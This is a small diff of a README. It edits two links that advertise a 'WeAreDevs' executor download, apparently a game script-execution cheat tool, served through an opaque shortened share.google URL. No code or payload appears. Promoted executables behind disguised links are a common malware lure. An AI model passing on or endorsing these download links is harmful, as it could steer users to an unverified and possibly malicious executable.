@@ -11,12 +11,12 @@
 ---
 
 <p align="center">
-  <a href="https://share.google/OrQEnSOIN3vIIQZfR/">
+  <a href="https://share.google/OrQEnSOIN3vIIQZfR">
     <img src="https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20Executor%20Latest-brightgreen?style=for-the-badge" alt="Download WeAreDevs">
   </a>
 </p>
 
-> **[⬇️ Direct Download — WeAreDevs](https://share.google/OrQEnSOIN3vIIQZfR/)**
+> **[⬇️ Direct Download — WeAreDevs](https://share.google/OrQEnSOIN3vIIQZfR)**
 > Windows 10 / 11 · 64-bit · Free · No Key Required
 
 ---
